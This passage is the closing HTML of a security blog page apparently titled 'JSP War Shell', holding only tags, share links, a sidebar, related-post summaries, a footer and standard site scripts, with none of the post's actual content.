</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/security/'>security</a>, <a href='/categories/web/'>web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/jsp/" class="post-tag no-text-decoration" >jsp</a> <a href="/tags/war/" class="post-tag no-text-decoration" >war</a> <a href="/tags/shell/" class="post-tag no-text-decoration" >shell</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JSP War Shell - Node Security&url=https://node-security.com/posts/jsp-war-shell/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JSP War Shell - Node Security&u=https://node-security.com/posts/jsp-war-shell/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=JSP War Shell - Node Security&url=https://node-security.com/posts/jsp-war-shell/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/building-a-plexus/">Building a Plexus</a><li><a href="/posts/api-fuzzing/">API Fuzzing</a><li><a href="/posts/basen-converter/">BaseN Converter</a><li><a href="/posts/certificate-generation-pure-nodejs/">Certificate Generate Pure NodeJS</a><li><a href="/posts/maze-colouring-with-dfs-and-bfs/">Maze Colouring with DFS and BFS</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/programming/">programming</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/certificate-generation-pure-nodejs/"><div class="card-body"> <span class="timeago small" >Sep 21<i class="unloaded">2021-09-21T01:07:50+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Certificate Generate Pure NodeJS</h3><div class="text-muted small"><p> This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node...</p></div></div></a></div><div class="card"> <a href="/posts/web-app-security/"><div class="card-body"> <span class="timeago small" >Sep 29<i class="unloaded">2021-09-29T18:01:50+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Web App Security</h3><div class="text-muted small"><p> General purpose guide for testing Web Applications. This list is not supposed to be exhaustive, nor is the information absolute. Each web application is different and the business case needs to be ...</p></div></div></a></div><div class="card"> <a href="/posts/jwt-fuzzing/"><div class="card-body"> <span class="timeago small" >May 25<i class="unloaded">2021-05-25T19:03:38+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>JWT Fuzzing</h3><div class="text-muted small"><p> The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ssh-port-forwarding/" class="btn btn-outline-primary" prompt="Older"><p>SSH Port Forwarding</p></a> <a href="/posts/android-hooking-in-frida/" class="btn btn-outline-primary" prompt="Newer"><p>Android Hooking in Frida</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/twitter_username">Alexander Wells</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/javascript/">javascript</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/http/">http</a> <a class="post-tag" href="/tags/https/">https</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/nodejs/">nodejs</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/programming/">programming</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-RCTP6RS6T4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-RCTP6RS6T4'); }); </script>
